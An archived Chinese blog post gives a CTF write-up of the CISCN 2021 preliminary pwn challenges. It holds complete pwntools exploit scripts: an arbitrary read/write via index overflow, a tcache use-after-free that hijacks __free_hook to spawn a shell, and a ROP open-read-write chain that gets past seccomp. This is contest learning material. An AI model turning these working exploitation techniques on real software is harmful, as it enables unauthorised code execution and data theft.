<!--yml
category: 未分类
date: 2022-04-26 14:31:49
-->

# 【CTF题解NO.00009】CISCN2021-初赛-pwn write up by arttnba3_arttnba3的博客-CSDN博客

> 来源：[https://blog.csdn.net/arttnba3/article/details/117097191](https://blog.csdn.net/arttnba3/article/details/117097191)

### 【CTF题解NO.00009】CISCN2021-初赛-pwn write up by arttnba3

# 0x00.绪论

国赛初赛划水，原本今年想摸了的（~~毕竟协会历来人丁稀少，能组出两个队去打就不错了，👴也没必要再勉强整第三个队，反正最后进去的就两个队，现在也不保研了，那就摸了算了~~），后面想想还是简单去康康~~今年360会不会像去年ylb那样拉跨~~，于是又抱上了囧姐姐和茜茜以及jchen三位带师傅的大腿组了一个摸🐟小队，~~结果比赛当天不知道为什么总之就是只有👴出了三道pwn，整到后面👴也没心思做了，再加上冲刺卷最后一题是LLVM，👴冲个🐓⑧，摸了，反正👴这队也不是主力队~~

以下 write up 主要摘自比赛当天队内的协作文档，~~以及👴感觉pwn好没用啊，还不如早点转web算了~~

# 0x01.场景实操 开场卷

## pwny | Done

一跑起来就 SIGSEGV，给👴整不会了，啥情况啊（暂时还没看IDA）

两个功能 read 和 write，但是 read 会直接 SIGSEGV ？

原来从 /dev/urandom 随机数发生器里读，read 好像读的事下标，那读歪了自然就直接 segmentation fault 了，但是👴好像妹法输入啊

read和 write 的 fd 都在 bss 上，write 改下标 256 两次就能把 fd 改成0

int64，那就整个负数补码让read往前读到 stdout，泄露 libc

再往前还能读到 elf 加载基址，这事ao的

可以任意地址写了，怎么写？写多少？👴一问三不知

environ在栈上构造ROP，但是总之就是很玄学一直没法通，后面莫名其妙又通了…

```
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
p_name = './pwny'
p = remote('124.71.239.124', 21662)
e = ELF(p_name)
libc = ELF('./libc-2.27.so')
one_gadget = [0x4f3d5, 0x4f432, 0x10a41c]

def cmd(command:int):
    p.recvuntil(b"Your choice:")
    p.sendline(str(command).encode())

def read(index):
    cmd(1)
    p.recvuntil(b"Index:")
    p.send(index)
    p.recvuntil(b'Result: ')

def write(index:int, content):
    cmd(2)
    p.recvuntil(b"Index:")
    p.sendline(str(index).encode())
    if content != None:
        p.send(content)

def exp():
    write(256, None)
    write(256, None)
    read(b'\xf8\xff\xff\xff\xff\xff\xff\xff')
    stdout_leak = int(b'0x' + p.recvuntil(b'\n', drop = True), 16)
    libc_base = stdout_leak - libc.sym['_IO_2_1_stdout_']
    log.success('libc base: ' + hex(libc_base))
    read(b'\xf5\xff\xff\xff\xff\xff\xff\xff')
    elf_leak = int(b'0x' + p.recvuntil(b'\n', drop = True), 16)
    elf_base = elf_leak - 0x202008
    log.success('elf base: ' + hex(elf_base))
    write((libc_base - (elf_base + 0x202060) + libc.sym['_IO_2_1_stderr_'])//8, b'/bin/sh\x00')
    write((libc_base - (elf_base + 0x202060) + libc.sym['_IO_2_1_stderr_'] + 0x28)//8, p64(libc_base + libc.sym['system']))
    read(p64((libc_base - (elf_base + 0x202060) + libc.sym['__environ'])//8))
    stack_leak = int(b'0x' + p.recvuntil(b'\n', drop = True), 16)
    log.info('stack leak: ' + hex(stack_leak))
    write((libc_base - (elf_base + 0x202060) + libc.sym['__free_hook'])//8, b'/bin/sh\x00')

    write((stack_leak - (elf_base + 0x202060) - 0x120 + 0x8)//8, p64(libc_base + libc.sym['__free_hook']))
    write((stack_leak - (elf_base + 0x202060) - 0x120 + 0x10)//8, p64(libc_base + libc.search(asm('pop rdi ; pop rbp ; ret')).__next__()))
    write((stack_leak - (elf_base + 0x202060) - 0x120 + 0x18)//8, p64(libc_base + libc.sym['__free_hook']))
    write((stack_leak - (elf_base + 0x202060) - 0x120 + 0x20)//8, p64(libc_base + libc.sym['system']))
    write((stack_leak - (elf_base + 0x202060) - 0x120 + 0x28)//8, p64(libc_base + libc.sym['system']))

    write((stack_leak - (elf_base + 0x202060) - 0x120)//8, p64(libc_base + libc.search(asm('pop rdi ; ret')).__next__()))

    p.interactive()

if __name__ == '__main__':
    exp() 
```

## lonelywolf | Done

比较明显地有一个 UAF

功能都比较全（指比较白给）

新版 libc2.27，有 double free 检测，~~考虑 tcache stash 机制绕过~~想了想没有必要，直接 edit 去掉 key 就完事了

限制size，考虑直接劫持 tcache struct，改free hook 为 system，👴老套板子做题人了

```
 from pwn import *
context.log_level = 'debug'
p_name = './lonelywolf'
p = remote('124.71.239.124', 21599)
e = ELF(p_name)
libc = ELF('./libc-2.27.so')

def cmd(command:int):
    p.recvuntil(b"Your choice: ")
    p.sendline(str(command).encode())

def new(size:int):
    cmd(1)
    p.recvuntil(b"Index: ")
    p.sendline(b'0')
    p.recvuntil(b"Size: ")
    p.sendline(str(size).encode())

def edit(content):
    cmd(2)
    p.recvuntil(b"Index: ")
    p.sendline(b'0')
    p.recvuntil(b"Content: ")
    p.sendline(content)

def dump():
    cmd(3)
    p.recvuntil(b"Index: ")
    p.sendline(b'0')
    p.recvuntil(b"Content: ")

def free():
    cmd(4)
    p.recvuntil(b"Index: ")
    p.sendline(b'0')

def exp():
    new(0x78)
    free()
    edit(b'arttnba3' * 2)
    free()
    dump()
    heap_leak = u64(p.recv(6).ljust(8, b'\x00'))
    heap_base = heap_leak & 0xfffffffff000
    log.success('heap base: ' + hex(heap_base))
    edit(p64(heap_base + 0x10))
    new(0x78)
    new(0x78)
    edit(b'\x00' * 35 + b'\x07')
    free()
    dump()
    main_arena = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x60 
    __malloc_hook = main_arena - 0x10
    libc_base = __malloc_hook - libc.sym['__malloc_hook']
    log.success('libc base:' + hex(libc_base))
    edit((b'\x01' * 2).ljust(64, b'\x00') + p64(libc_base + libc.sym['__free_hook']) + p64(heap_base + 0x10))

    new(16)
    edit(p64(libc_base + libc.sym['system']))

    new(32)
    edit('/bin/sh\x00')
    free()
    p.interactive()

if __name__ == '__main__':
    exp() 
```

## channel

aarch64 pwn，我爬了

简单看了一下应该是个堆，但是👴的 qemu-aarch64 跑不起来就离谱，后面也没心思看题了，等过段时间再复现，简单看了一下 fmyy 师傅的解法，好像也不是特别难的题，~~但是那天下午👴实在是太困了去睡觉了，惭愧~~

# 0x02.场景实操 二阶卷

## silverwolf | Done

和卷一的 lonelywolf 基本上一模一样，但是开了seccomp，考虑通过 environ 走 ORW

还是套板子题，但是libc里面的open函数不知道为啥用不了，那就回归简朴的syscall即可

总之堆题就一句话：套！套就完事了，没有堆题是不能够套板子弄出来的，~~人ACM都有板子套，👴做pwn为什么不能套~~

```
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
p_name = './silverwolf'
p = remote('124.71.239.124', 21632)
e = ELF(p_name)
libc = ELF('./libc-2.27.so')

def cmd(command:int):
    p.recvuntil(b"Your choice: ")
    p.sendline(str(command).encode())

def new(size:int):
    cmd(1)
    p.recvuntil(b"Index: ")
    p.sendline(b'0')
    p.recvuntil(b"Size: ")
    p.sendline(str(size).encode())

def edit(content):
    cmd(2)
    p.recvuntil(b"Index: ")
    p.sendline(b'0')
    p.recvuntil(b"Content: ")
    p.sendline(content)

def dump():
    cmd(3)
    p.recvuntil(b"Index: ")
    p.sendline(b'0')
    p.recvuntil(b"Content: ")

def free():
    cmd(4)
    p.recvuntil(b"Index: ")
    p.sendline(b'0')

def exp():
    for i in range(10):
        new(0x78)
    new(0x78)
    new(0x78)
    free()
    edit(b'arttnba3' * 2)
    free()
    dump()
    heap_leak = u64(p.recv(6).ljust(8, b'\x00'))
    heap_base = (heap_leak & 0xfffffffff000) - 0x1000
    log.success('heap base: ' + hex(heap_base))
    edit(p64(heap_base + 0x10))
    new(0x78)
    new(0x78)
    edit(b'\x00' * 35 + b'\x07')
    free()
    dump()
    main_arena = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x60 
    __malloc_hook = main_arena - 0x10
    libc_base = __malloc_hook - libc.sym['__malloc_hook']
    log.success('libc base:' + hex(libc_base))
    edit((b'\x01' * 2 + b'\x00' * 4 + b'\x01').ljust(64, b'\x00') + p64(libc_base + libc.sym['__environ']) + p64(libc_base + libc.sym['__free_hook']) + p64(heap_base + 0x10) * 5)
    new(0x10)
    dump()
    stack_leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
    log.info('stack leak: ' + hex(stack_leak))
    new(0x20)
    edit(b'/flag\x00')
    new(0x78)
    edit((b'\x00' * 6 + b'\x01').ljust(64, b'\x00') + b'arttnba3' * 5 + p64(stack_leak - 0x120 + 0x70) + p64(stack_leak - 0x120))

    flag_addr = libc_base + libc.sym['__free_hook']
    pop_rdi_ret = libc_base + libc.search(asm("pop rdi ; ret")).__next__()
    pop_rsi_ret = libc_base + libc.search(asm("pop rsi ; ret")).__next__()
    pop_rdx_ret = libc_base + libc.search(asm("pop rdx ; ret")).__next__()
    pop_rdx_pop_rbx_ret = libc_base + libc.search(asm('pop rdx ; pop rbx ; ret')).__next__()
    pop_rax_ret = libc_base + libc.search(asm("pop rax ; ret")).__next__()
    syscall_ret = libc_base + libc.search(asm("syscall ; ret")).__next__()

    orw = b''
    orw += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(4) + p64(pop_rax_ret) + p64(2) + p64(syscall_ret)
    orw += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(0x40)
    orw2 = p64(libc_base + libc.sym['read']) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(0x40) + p64(0) + p64(libc_base + libc.sym['write'])

    new(0x68)
    edit(orw2)
    new(0x78)
    edit(orw)
    p.interactive()

if __name__ == '__main__':
    exp() 
```

## game

vm pwn？逆得有些头大了

🛏💤

# 0x03.场景实操 冲刺卷

## satool

L L V M 我 做 你 🦄

🛏💤